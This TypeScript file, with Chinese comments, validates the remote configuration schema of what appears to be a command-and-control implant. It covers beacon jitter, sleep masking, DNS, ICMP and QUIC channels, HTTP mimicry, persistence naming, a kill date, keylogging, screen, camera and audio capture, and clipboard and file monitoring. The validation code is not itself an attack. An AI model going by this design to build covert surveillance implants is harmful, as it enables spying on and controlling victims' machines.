/**
 * Agent 远程配置契约镜像（前端侧）—— 与 Agent/Core/Config/ConfigContract.hpp +
 * AgentConfigJson.cpp（ApplyXxx 钳位 / ToJson 字段序）对齐。
 *
 * 分层职责：
 * - 顶层子域清单与注释：运行时以 GetConfig 响应里的 `_contract` 为准（单一数据源），
 *   本文件的 FALLBACK_CONTRACT 仅在响应缺失 `_contract`（旧 Agent）时兜底。
 * - 域内字段规则：Agent 侧 `_contract` 只声明顶层键，域内校验由前端维护本表，
 *   规则来源 = AgentConfigJson.cpp 各 ApplyXxx 的钳位/解析逻辑。
 *
 * 校验严重度分层（对齐 Agent 侧真实语义，不是拍脑袋）：
 * - error   ：发了也**不生效**的字段 —— ReadXxx 类型失败/枚举不匹配/HH:MM 解析失败时
 *             Agent 静默保留原值；channels 结构错误则整链拒绝。前端必须拦。
 * - warning ：**钳位型**字段 —— 超范围会被 Agent clamp 到合法区间，仍会生效。
 *             前端提示不拦截，以 Agent 生效为准。
 * - 未知键  ：warning（Agent 按约定忽略未知字段）。
 */

// ============ 顶层契约（镜像 ConfigContract.hpp） ============

export type ContractKind = 'domain' | 'bool' | 'int' | 'uint' | 'string'

export interface ContractKeySpec {
  name: string
  kind: ContractKind
  note: string
}

/** 顶层子域展示/提交顺序（= ConfigContractKeys 顺序；运行时被 _contract 覆盖） */
export const FALLBACK_CONTRACT: ContractKeySpec[] = [
  { name: 'heartbeat', kind: 'domain', note: '心跳节拍(base/jitter/丢拍)' },
  { name: 'reconnect', kind: 'domain', note: '重连退避(base/max/抖动)' },
  { name: 'transport_failover', kind: 'domain', note: '降级链策略(回探/驻留)' },
  { name: 'recovery', kind: 'domain', note: '死投递恢复(平台清单/阈值/重试节奏; key 不回读)' },
  { name: 'channels', kind: 'domain', note: '通道降级链(整体替换, 热切换)' },
  { name: 'channel_limit', kind: 'domain', note: '低带宽通道报文限流(黑名单/明细)' },
  { name: 'service_defaults', kind: 'domain', note: '服务默认参数(采样率/间隔/分块)' },
  { name: 'capture', kind: 'domain', note: '采集参数(截屏/摄像头质量)' },
  { name: 'clipboard', kind: 'domain', note: '剪贴板监控(间隔/规则)' },
  { name: 'file_monitor', kind: 'domain', note: '文件监控(目录/递归/规则)' },
  { name: 'lifecycle', kind: 'domain', note: '生命周期(killdate/工作时间)' },
  { name: 'runtime', kind: 'domain', note: '运行参数(first_connect_delay_max_ms/worker_timeout_ms/log_level; crash_dump_enabled 已移除——崩溃日志改由构建期决定)' },
  { name: 'http', kind: 'domain', note: 'HTTP 伪装与出站(user_agent/ignore_cert/proxy/mimic)' },
  { name: 'quic', kind: 'domain', note: 'QUIC 通道选项(ignore_cert)' },
  { name: 'mask', kind: 'domain', note: '睡眠掩码(enabled/sleep_ms/jitter_permille; 执行体需 CLEAT_WITH_MASK 构建, 未编入时配置无害)' },
  { name: 'persist', kind: 'domain', note: '持久化标识(value_name/task_name/author)' },
]

// ============ 域内字段规则 ============

export type FieldRule =
  | { kind: 'uint' | 'int'; min?: number; max?: number }
  | { kind: 'bool' }
  | { kind: 'string'; maxLen?: number }
  /** "HH:MM"（lifecycle.work_start/work_end；Agent ParseHHMM 失败即静默保留原值） */
  | { kind: 'hhmm' }
  /** 枚举字符串（非法值 Agent 静默保留原值） */
  | { kind: 'enum'; values: readonly string[] }
  /** 字符串数组（channel_limit.deny / file_monitor.watch） */
  | { kind: 'stringArray'; values?: readonly string[] }
  /** recovery.platforms：{type,url}[]，≤8，url ≤2048，残缺条目被 Agent 跳过 */
  | { kind: 'platforms' }
  /** channels：ChannelSpec[]，整链替换，任一条非法整链拒绝 */
  | { kind: 'channelArray' }
  /** channel_limit.commands：Record<string, {max_bytes, rate_per_min}> */
  | { kind: 'limitCommands' }
  /** channel_limit.default：{max_bytes, rate_per_min}，钳位 0..16MiB / 0..10000 */
  | { kind: 'limitRule' }
  /** clipboard.rules：{name,type,pattern,keywords[]}[]，type∈regex|keyword|always（否则条目被丢弃） */
  | { kind: 'clipboardRules' }
  /** file_monitor.rules：{name,type,extensions[],pattern}[]，type∈extension|path_regex|always */
  | { kind: 'fileMonitorRules' }

export interface FieldSpecBase {
  /** 中文标签（diff/applied 面板展示用） */
  label: string
  /** 可选说明（伪 JSON 注释旁注 / 校验提示用） */
  note?: string
}

/** 域内字段规格 = 校验规则 + 展示标签（交叉类型保留 FieldRule 的判别联合） */
export type FieldSpec = FieldRule & FieldSpecBase

/**
 * 域内字段规则表。键顺序 = 伪 JSON 序列化顺序（对齐 Agent ToJson 输出序）。
 * 域内字段缺省行为：未出现在本表的字段视为"未知字段"→ warning 不拦截。
 */
export const DOMAIN_FIELDS: Record<string, Record<string, FieldSpec>> = {
  runtime: {
    first_connect_delay_max_ms: { kind: 'uint', min: 0, max: 300000, label: '首连随机延时上限(ms)' },
    worker_timeout_ms: { kind: 'uint', min: 100, max: 3600000, note: '0 = 不限时；1~99 将被钳到 100', label: '命令执行超时(ms)' },
    log_level: { kind: 'int', min: 0, max: 4, note: '0 DEBUG / 1 INFO / 2 WARN / 3 ERROR / 4 OFF', label: '日志级别' },
    // crash_dump_enabled 已于  从 Agent 移除（崩溃日志改由构建期决定，
    // Debug 恒开 / Release 恒关）；下发该键 = 未知字段被忽略，不再作为可调字段。
  },
  http: {
    user_agent: { kind: 'string', note: '空串 = 清除显式值回随机池', label: 'User-Agent' },
    ignore_cert: { kind: 'bool', label: '忽略 TLS 证书校验' },
    proxy: { kind: 'string', note: '空 = 直连 | system = 系统代理 | host:port', label: 'HTTPS 代理' },
    mimic: { kind: 'bool', note: 'TCP 通道 HTTP 伪装壳开关（默认开，对齐原编译期宏 CLEAT_HTTP_MIMIC）', label: 'TCP 伪装壳' },
  },
  quic: {
    ignore_cert: { kind: 'bool', note: '跳过 QUIC 对端证书校验（自签监听场景须开启；默认严格）', label: 'QUIC 忽略证书' },
  },
  mask: {
    enabled: { kind: 'bool', note: '睡眠掩码总开关（仅 Poll 通道 + 全静默时生效；执行体需 CLEAT_WITH_MASK 构建，未编入时打开无害——判定层按不可用拒绝）', label: '启用睡眠掩码' },
    sleep_ms: { kind: 'uint', min: 30000, max: 120000, note: '掩码窗口时长 ±抖动随机取样（下限 30s：更短的窗掩码收益薄、链固定开销占比过高）。建议与心跳 base_interval 同档', label: '掩码窗口(ms)' },
    jitter_permille: { kind: 'uint', min: 0, max: 1000, note: '窗长抖动(千分比)，每次窗口独立取样', label: '窗长抖动(‰)' },
  },
  persist: {
    value_name: { kind: 'string', note: '空串 = 随机', label: '持久化 值名称' },
    task_name: { kind: 'string', note: '空串 = 随机', label: '持久化 任务名' },
    author: { kind: 'string', note: '空串 = 随机', label: '持久化 作者' },
  },
  heartbeat: {
    base_interval_ms: { kind: 'uint', min: 1000, max: 3600000, label: '心跳基础间隔(ms)' },
    jitter_ratio_permille: { kind: 'uint', min: 0, max: 1000, label: '抖动幅度(‰)' },
    active_interval_ms: { kind: 'uint', min: 500, max: 60000, label: '活跃态心跳间隔(ms)' },
    activity_window_ms: { kind: 'uint', min: 1000, max: 600000, label: '活跃判定窗口(ms)' },
    jitter_distribution: { kind: 'uint', min: 0, max: 1, label: '抖动分布模式' },
    jitter_std_permille: { kind: 'uint', min: 0, max: 1000, label: '抖动标准差(‰)' },
    jitter_mean_bias_permille: { kind: 'int', min: -1000, max: 1000, label: '抖动均值偏移(‰)' },
    skip_beat_permille: { kind: 'uint', min: 0, max: 1000, label: '跳拍概率(‰)' },
  },
  reconnect: {
    first_connect_base_ms: { kind: 'uint', min: 100, max: 300000, label: '首连退避起点(ms)' },
    first_connect_max_ms: { kind: 'uint', min: 100, max: 300000, note: '钳位下限 = first_connect_base_ms', label: '首连退避上限(ms)' },
    base_ms: { kind: 'uint', min: 100, max: 300000, label: '断线重连起点(ms)' },
    max_ms: { kind: 'uint', min: 100, max: 300000, note: '钳位下限 = base_ms', label: '断线重连上限(ms)' },
    jitter_permille: { kind: 'uint', min: 0, max: 1000, label: '退避抖动(‰)' },
  },
  transport_failover: {
    fail_threshold: { kind: 'uint', min: 1, max: 100, label: '失败切换阈值(次)' },
    min_hold_ms: { kind: 'uint', min: 1000, max: 3600000, label: '切换后最小保持(ms)' },
    probe_interval_ms: { kind: 'uint', min: 5000, max: 3600000, label: '回探周期(ms)' },
  },
  recovery: {
    prefix: { kind: 'string', maxLen: 256, label: '文件名前缀' },
    platforms: { kind: 'platforms', label: '平台清单(有序=优先级)' },
    recover_after_fails: { kind: 'uint', min: 2, max: 200, label: '进入恢复的连续失败数' },
    retry_min_minutes: { kind: 'uint', min: 0, max: 10080, note: '0 = 跟随重连退避', label: '重试间隔下限(分钟)' },
    retry_max_minutes: { kind: 'uint', min: 0, max: 10080, label: '重试间隔上限(分钟)' },
    upload_path: { kind: 'string', maxLen: 256, label: '上传路径' },
    // key：可写不可读（敏感材料不回读），编辑器不展示不提交 —— 设置走 CLI
  },
  channels: {
    // 整链结构校验走 channelArray；域内不放字段级规则
  },
  channel_limit: {
    enabled: { kind: 'bool', label: '限流总开关' },
    deny: { kind: 'stringArray', label: '命令名黑名单' },
    commands: { kind: 'limitCommands', label: '命令明细限流' },
    default: { kind: 'limitRule', label: '默认限流规则' },
  },
  service_defaults: {
    audio_report_interval_ms: { kind: 'uint', min: 1000, max: 60000, label: '录音推送间隔(ms)' },
    audio_sample_rate: { kind: 'uint', min: 8000, max: 192000, label: '音频采样率(Hz)' },
    audio_channels: { kind: 'uint', min: 1, max: 2, label: '音频声道数' },
    audio_bits_per_sample: { kind: 'uint', min: 8, max: 32, label: '音频位深(bit)' },
    keylog_report_interval_ms: { kind: 'uint', min: 1000, max: 60000, label: '按键推送间隔(ms)' },
    desktop_frame_interval_ms: { kind: 'uint', min: 100, max: 60000, label: '桌面推帧间隔(ms)' },
    camera_frame_interval_ms: { kind: 'uint', min: 100, max: 60000, label: '摄像头推帧间隔(ms)' },
    download_chunk_size: { kind: 'uint', min: 1024, max: 10485760, label: '下载分块大小(B)' },
  },
  capture: {
    screenshot_quality: { kind: 'uint', min: 1, max: 100, label: '截图 JPEG 质量' },
    camera_quality: { kind: 'uint', min: 1, max: 100, label: '摄像头 JPEG 质量' },
    screenshot_scale: { kind: 'uint', min: 1, max: 400, note: '缩放百分比（Agent 侧未接线）', label: '截图缩放(%)' },
  },
  clipboard: {
    monitor_interval_ms: { kind: 'uint', min: 200, max: 60000, label: '监控间隔(ms)' },
    max_report_len: { kind: 'uint', min: 64, max: 65536, label: '上报最大长度' },
    min_len: { kind: 'uint', min: 1, max: 1024, label: '最短上报长度' },
    rules: { kind: 'clipboardRules', label: '规则集(整体覆盖)' },
  },
  file_monitor: {
    path: { kind: 'string', label: '监控目录' },
    recursive: { kind: 'bool', label: '递归子目录' },
    watch: { kind: 'stringArray', values: ['create', 'modify', 'delete', 'rename'], note: '空 = 全部事件', label: '监听事件' },
    rules: { kind: 'fileMonitorRules', label: '规则集(整体覆盖)' },
  },
  lifecycle: {
    kill_date_utc: { kind: 'uint', min: 0, note: 'epoch 秒，0 = 清除', label: '失效时间' },
    work_start: { kind: 'hhmm', label: '工作时段开始' },
    work_end: { kind: 'hhmm', label: '工作时段结束' },
    outside_policy: { kind: 'enum', values: ['pause', 'exit'], label: '时段外策略' },
  },
}

// ---- 复合结构内字段顺序（伪 JSON 序列化用，对齐 Agent ToJson） ----

/** ChannelSpec 序列化序（Agent ToJson(vector<ChannelSpec>)） */
export const CHANNEL_FIELD_ORDER = ['type', 'host', 'port', 'url', 'upload_url', 'dns_server', 'dns_domain', 'icmp_target'] as const
/** 可入链的通道类型（对齐 Agent/Core/Config/ChannelFieldRules.hpp::ChannelFieldsSatisfied；pipe 为 Pivot 内部通道, 不进主链） */
export const CHANNEL_TYPES = ['https', 'tcp', 'dns', 'icmp', 'wss', 'quic'] as const
/** 按 ChannelFieldsSatisfied()：各 type 的必填字段（[] = 组合判据, 由 validateChannels 单独校验） */
export const CHANNEL_REQUIRED: Record<string, readonly string[]> = {
  https: [],            // url 或 host 任一非空
  wss: [],              // url 或 host 任一非空（url 须 wss:// 前缀方能物化）
  quic: [],             // url 须 quic:// 前缀，或显式 host（二选一）
  tcp: [],              // host 可空 = 沿用启动 -host/-port
  dns: ['dns_server', 'dns_domain'],
  icmp: ['icmp_target'],
}
export const PLATFORM_FIELD_ORDER = ['type', 'url'] as const
export const LIMIT_RULE_FIELD_ORDER = ['max_bytes', 'rate_per_min'] as const
export const CLIPBOARD_RULE_FIELD_ORDER = ['name', 'type', 'pattern', 'keywords'] as const
export const FILEMON_RULE_FIELD_ORDER = ['name', 'type', 'extensions', 'pattern'] as const
export const CLIPBOARD_RULE_TYPES = ['regex', 'keyword', 'always'] as const
export const FILEMON_RULE_TYPES = ['extension', 'path_regex', 'always'] as const

// ============ 校验结果结构 ============

export interface ValidationIssue {
  /** 字段路径："heartbeat.base_interval_ms" / "channels[1].port" */
  path: string
  severity: 'error' | 'warning'
  /** 中文描述 */
  message: string
  /** 文档内 1-based 行号（可定位时填充，由 pseudoJson 层回填） */
  line?: number
}

// ============ 单值校验 ============

const isInt = (v: unknown): v is number => typeof v === 'number' && Number.isInteger(v)

/**
 * 按规则校验标量/简单结构值，产出 issue（不含 line，行定位由调用方回填）。
 * 钳位型越界 = warning；类型/枚举/格式错误 = error。
 */
export function validateByRule(path: string, value: unknown, rule: FieldSpec): ValidationIssue[] {
  const out: ValidationIssue[] = []
  const got = Array.isArray(value) ? 'array' : typeof value

  switch (rule.kind) {
    case 'uint':
    case 'int': {
      if (!isInt(value)) {
        out.push({ path, severity: 'error', message: `类型错误：期望${rule.kind === 'uint' ? '非负' : ''}整数，实际为 ${got}` })
        break
      }
      if (rule.kind === 'uint' && value < 0) {
        out.push({ path, severity: 'error', message: '类型错误：期望非负整数，实际为负数' })
        break
      }
      const min = rule.min ?? (rule.kind === 'uint' ? 0 : -Infinity)
      const max = rule.max ?? Infinity
      if (value < min || value > max) {
        // worker_timeout_ms 的 0 特例：0 = 不限时，合法（min=100 只约束非零值）
        const zeroOk = path.endsWith('worker_timeout_ms') && value === 0
        if (!zeroOk) {
          out.push({ path, severity: 'warning', message: `超出范围 [${min}, ${max}]，Agent 将钳位到合法区间` })
        }
      }
      break
    }
    case 'bool':
      if (typeof value !== 'boolean') out.push({ path, severity: 'error', message: `类型错误：期望 boolean，实际为 ${got}` })
      break
    case 'string':
      if (typeof value !== 'string') {
        out.push({ path, severity: 'error', message: `类型错误：期望 string，实际为 ${got}` })
      } else if (rule.maxLen && value.length > rule.maxLen) {
        out.push({ path, severity: 'warning', message: `长度 ${value.length} 超过上限 ${rule.maxLen}，Agent 将截断` })
      }
      break
    case 'hhmm':
      if (typeof value !== 'string' || !/^([01]?\d|2[0-3]):([0-5]\d)$/.test(value)) {
        out.push({ path, severity: 'error', message: `格式错误：期望 "HH:MM"（00:00~23:59），实际为 ${JSON.stringify(value) ?? got}；非法值 Agent 静默保留原值` })
      }
      break
    case 'enum':
      if (typeof value !== 'string' || !(rule.values as readonly string[]).includes(value)) {
        out.push({ path, severity: 'error', message: `取值非法：期望 ${rule.values.map(v => `"${v}"`).join(' / ')}，实际为 ${JSON.stringify(value) ?? got}；非法值 Agent 静默保留原值` })
      }
      break
    case 'stringArray': {
      if (!Array.isArray(value) || value.some(v => typeof v !== 'string')) {
        out.push({ path, severity: 'error', message: `类型错误：期望 string 数组，实际为 ${got}` })
        break
      }
      if (rule.values) {
        const bad = value.filter(v => !(rule.values as readonly string[]).includes(v))
        if (bad.length > 0) out.push({ path, severity: 'warning', message: `含未知取值 ${bad.map(v => `"${v}"`).join(', ')}（允许：${rule.values.join(', ')}），Agent 将忽略` })
      }
      break
    }
    case 'platforms': {
      if (!Array.isArray(value)) {
        out.push({ path, severity: 'error', message: `类型错误：期望数组，实际为 ${got}` })
        break
      }
      if (value.length > 8) out.push({ path, severity: 'warning', message: `平台数 ${value.length} 超过上限 8，Agent 将只取前 8 条` })
      value.forEach((item, i) => {
        const p = `${path}[${i}]`
        if (typeof item !== 'object' || item === null || Array.isArray(item)) {
          out.push({ path: p, severity: 'error', message: '平台条目必须是 {type, url} 对象' })
          return
        }
        const o = item as Record<string, unknown>
        if (typeof o.type !== 'string' || o.type === '') out.push({ path: `${p}.type`, severity: 'error', message: 'type 必须是非空字符串（残缺条目 Agent 会跳过）' })
        if (typeof o.url !== 'string' || o.url === '') out.push({ path: `${p}.url`, severity: 'error', message: 'url 必须是非空字符串（残缺条目 Agent 会跳过）' })
        else if (o.url.length > 2048) out.push({ path: `${p}.url`, severity: 'warning', message: `url 长度 ${o.url.length} 超过 2048，Agent 将截断或跳过` })
      })
      break
    }
    case 'channelArray':
      // 结构校验在 pseudoJson.ts 的 validateChannels（需要独立报错路径），此处不重复
      break
    case 'limitCommands': {
      if (typeof value !== 'object' || value === null || Array.isArray(value)) {
        out.push({ path, severity: 'error', message: `类型错误：期望对象，实际为 ${got}` })
        break
      }
      for (const [cmd, v] of Object.entries(value as Record<string, unknown>)) {
        const p = `${path}.${cmd}`
        if (typeof v !== 'object' || v === null || Array.isArray(v)) {
          out.push({ path: p, severity: 'error', message: '每条限流必须是 {max_bytes, rate_per_min} 对象（非对象条目 Agent 会跳过）' })
          continue
        }
        const o = v as Record<string, unknown>
        if (!isInt(o.max_bytes) || o.max_bytes < 0) out.push({ path: `${p}.max_bytes`, severity: 'error', message: 'max_bytes 必须是非负整数' })
        else if (o.max_bytes > 16777216) out.push({ path: `${p}.max_bytes`, severity: 'warning', message: '超过 16MiB 上限，Agent 将钳位到 16777216' })
        if (!isInt(o.rate_per_min) || o.rate_per_min < 0) out.push({ path: `${p}.rate_per_min`, severity: 'error', message: 'rate_per_min 必须是非负整数' })
        else if (o.rate_per_min > 10000) out.push({ path: `${p}.rate_per_min`, severity: 'warning', message: '超过 10000 上限，Agent 将钳位' })
      }
      break
    }
    case 'limitRule': {
      if (typeof value !== 'object' || value === null || Array.isArray(value)) {
        out.push({ path, severity: 'error', message: `类型错误：期望对象，实际为 ${got}` })
        break
      }
      const o = value as Record<string, unknown>
      if (!isInt(o.max_bytes) || o.max_bytes < 0) out.push({ path: `${path}.max_bytes`, severity: 'error', message: 'max_bytes 必须是非负整数' })
      else if (o.max_bytes > 16777216) out.push({ path: `${path}.max_bytes`, severity: 'warning', message: '超过 16MiB 上限，Agent 将钳位' })
      if (!isInt(o.rate_per_min) || o.rate_per_min < 0) out.push({ path: `${path}.rate_per_min`, severity: 'error', message: 'rate_per_min 必须是非负整数' })
      else if (o.rate_per_min > 10000) out.push({ path: `${path}.rate_per_min`, severity: 'warning', message: '超过 10000 上限，Agent 将钳位' })
      break
    }
    case 'clipboardRules': {
      if (!Array.isArray(value)) {
        out.push({ path, severity: 'error', message: `类型错误：期望数组，实际为 ${got}` })
        break
      }
      value.forEach((item, i) => {
        const p = `${path}[${i}]`
        if (typeof item !== 'object' || item === null || Array.isArray(item)) {
          out.push({ path: p, severity: 'error', message: '规则条目必须是对象（非对象条目 Agent 会跳过）' })
          return
        }
        const o = item as Record<string, unknown>
        if (typeof o.type !== 'string' || !(CLIPBOARD_RULE_TYPES as readonly string[]).includes(o.type)) {
          out.push({ path: `${p}.type`, severity: 'error', message: `type 必须是 ${CLIPBOARD_RULE_TYPES.join(' / ')}（其他值该条会被 Agent 丢弃）` })
        }
        if (o.name !== undefined && typeof o.name !== 'string') out.push({ path: `${p}.name`, severity: 'error', message: 'name 必须是字符串' })
        if (o.pattern !== undefined && typeof o.pattern !== 'string') out.push({ path: `${p}.pattern`, severity: 'error', message: 'pattern 必须是字符串' })
        if (o.keywords !== undefined && (!Array.isArray(o.keywords) || o.keywords.some(k => typeof k !== 'string'))) {
          out.push({ path: `${p}.keywords`, severity: 'error', message: 'keywords 必须是字符串数组' })
        }
      })
      break
    }
    case 'fileMonitorRules': {
      if (!Array.isArray(value)) {
        out.push({ path, severity: 'error', message: `类型错误：期望数组，实际为 ${got}` })
        break
      }
      value.forEach((item, i) => {
        const p = `${path}[${i}]`
        if (typeof item !== 'object' || item === null || Array.isArray(item)) {
          out.push({ path: p, severity: 'error', message: '规则条目必须是对象（非对象条目 Agent 会跳过）' })
          return
        }
        const o = item as Record<string, unknown>
        if (typeof o.type !== 'string' || !(FILEMON_RULE_TYPES as readonly string[]).includes(o.type)) {
          out.push({ path: `${p}.type`, severity: 'error', message: `type 必须是 ${FILEMON_RULE_TYPES.join(' / ')}（其他值该条会被 Agent 丢弃）` })
        }
        if (o.name !== undefined && typeof o.name !== 'string') out.push({ path: `${p}.name`, severity: 'error', message: 'name 必须是字符串' })
        if (o.pattern !== undefined && typeof o.pattern !== 'string') out.push({ path: `${p}.pattern`, severity: 'error', message: 'pattern 必须是字符串' })
        if (o.extensions !== undefined && (!Array.isArray(o.extensions) || o.extensions.some(e => typeof e !== 'string'))) {
          out.push({ path: `${p}.extensions`, severity: 'error', message: 'extensions 必须是字符串数组' })
        }
      })
      break
    }
  }
  return out
}

/**
 * channels 整链校验（对齐 ApplyJson channels 分支 + ChannelFieldRulesSatisfied）：
 * 任一条非法 → 整链拒绝（error，必须拦）；合法条目的可改进点用 warning。
 * 空数组 = warning（不是 error）：Agent 虽拒绝空链，但"未下发"状态回读就是空数组，
 * 提交侧对"未编辑的空链"会剔键不发（）——标 error 会把空链状态的回读页
 * 全体打红、锁死提交按钮，与"空链保持"设计直接冲突。
 */
export function validateChannels(value: unknown): ValidationIssue[] {
  const out: ValidationIssue[] = []
  const path = 'channels'
  if (!Array.isArray(value)) {
    out.push({ path, severity: 'error', message: `类型错误：期望数组，实际为 ${Array.isArray(value) ? 'array' : typeof value}；channels 必须是数组` })
    return out
  }
  if (value.length === 0) {
    out.push({ path, severity: 'warning', message: 'channels 为空数组：Agent 拒绝空链（未编辑的空链提交时会自动剔除不发；如需下发请填入至少一条通道）' })
    return out
  }
  value.forEach((item, i) => {
    const p = `${path}[${i}]`
    if (typeof item !== 'object' || item === null || Array.isArray(item)) {
      out.push({ path: p, severity: 'error', message: '通道条目必须是对象' })
      return
    }
    const o = item as Record<string, unknown>
    const type = typeof o.type === 'string' ? o.type.toLowerCase() : ''
    if (!(CHANNEL_TYPES as readonly string[]).includes(type)) {
      out.push({ path: `${p}.type`, severity: 'error', message: `type 必须是 ${CHANNEL_TYPES.join(' / ')}（大小写不敏感），实际为 ${JSON.stringify(o.type) ?? typeof o.type}` })
      return
    }
    if (o.port !== undefined) {
      if (!isInt(o.port) || o.port < 0 || o.port > 65535) {
        out.push({ path: `${p}.port`, severity: 'error', message: `port 必须是 [0, 65535] 内的整数，实际为 ${JSON.stringify(o.port)}` })
      }
    }
    // ChannelFieldsSatisfied()：按 type 检查判据（与 Agent 单一数据源逐条对齐）
    if ((type === 'https' || type === 'wss')
      && !(typeof o.url === 'string' && o.url !== '') && !(typeof o.host === 'string' && o.host !== '')) {
      out.push({ path: p, severity: 'error', message: `${type} 通道需要 url 或 host 至少其一非空` })
    }
    if (type === 'quic') {
      const urlOk = typeof o.url === 'string' && o.url.startsWith('quic://')
      const hostOk = typeof o.host === 'string' && o.host !== ''
      if (!urlOk && !hostOk) {
        out.push({ path: p, severity: 'error', message: 'quic 通道需要 "quic://" 前缀的 url 或显式 host（至少其一）' })
      } else if (typeof o.url === 'string' && o.url !== '' && !urlOk) {
        out.push({ path: `${p}.url`, severity: 'warning', message: 'url 非 "quic://" 前缀且已有 host 兜底时该 url 会被忽略（quic 判据只认 quic:// URL）' })
      }
    }
    if (type === 'dns') {
      if (!(typeof o.dns_server === 'string' && o.dns_server !== '')) out.push({ path: `${p}.dns_server`, severity: 'error', message: 'dns 通道 dns_server 必填' })
      if (!(typeof o.dns_domain === 'string' && o.dns_domain !== '')) out.push({ path: `${p}.dns_domain`, severity: 'error', message: 'dns 通道 dns_domain 必填' })
    }
    if (type === 'icmp' && !(typeof o.icmp_target === 'string' && o.icmp_target !== '')) {
      out.push({ path: `${p}.icmp_target`, severity: 'error', message: 'icmp 通道 icmp_target 必填' })
    }
    // 通道链的 wss 地址由通用 url 槽承载（Agent ApplyJson 不读 wss_url）——避免"写了不生效"
    if (type === 'wss' && typeof o.wss_url === 'string' && o.wss_url !== '') {
      out.push({ path: `${p}.wss_url`, severity: 'warning', message: '通道链内 Agent 不读 wss_url：wss 地址请写进 url（如 wss://host:port/ws）' })
    }
    for (const k of ['type', 'host', 'url', 'upload_url', 'dns_server', 'dns_domain', 'icmp_target'] as const) {
      if (o[k] !== undefined && typeof o[k] !== 'string') {
        out.push({ path: `${p}.${k}`, severity: 'error', message: `字段 ${k} 必须是字符串` })
      }
    }
  })
  return out
}
